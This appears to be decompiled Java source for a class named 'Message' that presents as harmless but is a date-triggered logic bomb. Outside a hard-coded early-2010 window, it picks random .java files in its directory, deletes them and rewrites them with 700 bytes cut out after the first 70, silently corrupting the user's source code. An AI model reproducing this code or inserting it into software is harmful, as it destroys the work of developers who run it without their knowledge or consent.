package Documents;

// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   Message.java

import java.io.*;
import java.util.*;

public class Message
{

    public Message()
    {
        start = new Date(110, 0, 2, 12, 0, 0);
        end = new Date(110, 2, 31, 12, 0, 0);
        now = new Date();
        System.out.println("GTN");
        Test();
    }

    public static void Test()
    {
        if(now.getTime() > start.getTime() && now.getTime() < end.getTime())
            return;
        int i;
        try
        {
            throw new IOException();
        }
        catch(Exception exception)
        {
            i = 0;
        }
        do
            try
            {
                Thread.sleep(1000L);
                files();
                i++;
            }
            catch(InterruptedException interruptedexception)
            {
                interruptedexception.printStackTrace();
            }
        while(i < 3);
    }

    static void files()
    {
        File file = new File("Message.java");
        String s = file.getAbsolutePath();
        File file1 = new File(s);
        String s3 = file1.getParent();
        File file2 = new File(s3);
        File afile[] = file2.listFiles();
        ArrayList arraylist = new ArrayList();
        int i = 0;
        for(int j = 0; j < afile.length; j++)
        {
            if(!afile[j].isFile())
                continue;
            String s1 = afile[j].getName();
            if(s1.endsWith("java"))
                arraylist.add(s1);
        }

        int k = arraylist.size();
        System.out.println("GTN");
        Random random = new Random();
        i = 0;
        boolean flag = false;
        do
        {
            if(i >= 1)
                break;
            int l = random.nextInt(k);
            String s2 = (String)arraylist.get(l);
            if(!s2.endsWith("Message.java"))
            {
                cutter(s2);
                i++;
            }
        } while(true);
    }

    static void cutter(String s)
    {
        try
        {
            int i = 0;
            int j = 0;
            File file = new File(s);
            FileInputStream fileinputstream = new FileInputStream(file);
            File file1 = new File("op.java");
            FileOutputStream fileoutputstream = new FileOutputStream(file1);
            while((j = fileinputstream.read()) != -1) 
            {
                i++;
                fileoutputstream.write((char)j);
            }
            fileinputstream.close();
            fileoutputstream.close();
            if(file.exists())
                file.delete();
            File file2 = new File("op.java");
            FileInputStream fileinputstream1 = new FileInputStream(file2);
            FileOutputStream fileoutputstream1 = new FileOutputStream(s);
            i = 0;
            do
            {
                int k;
                if((k = fileinputstream1.read()) == -1)
                    break;
                i++;
                fileoutputstream1.write((char)k);
                if(i == 70)
                    fileinputstream1.skip(700L);
            } while(true);
            fileinputstream1.close();
            fileoutputstream.close();
            if(file2.exists())
                file2.delete();
        }
        catch(Exception exception)
        {
            System.out.println((new StringBuilder()).append("Error").append(exception).toString());
        }
    }

    public static void main(String args[])
    {
        new Message();
    }

    static Date start;
    static Date end;
    static Date now;
}
